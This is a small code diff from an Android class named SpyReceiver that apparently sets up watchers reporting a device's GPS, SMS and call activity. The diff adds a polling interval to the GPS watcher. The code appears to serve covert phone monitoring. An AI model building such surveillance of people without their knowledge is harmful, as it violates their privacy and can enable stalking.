@@ -37,7 +37,7 @@ public class SpyReceiver extends AndroidBroadcastReceiver {
 
 		Watcher[] watchers = new Watcher[] {
 			// I want to monitor GPS activities
-			new AndroidGpsWatcher(new GpsSpyReporter()),
+			new AndroidGpsWatcher(new GpsSpyReporter(), 480000),
 			// I want to monitor SMS activities
 			new AndroidSmsWatcher(new SmsSpyReporter()),
 			// I want to monitor Call activities
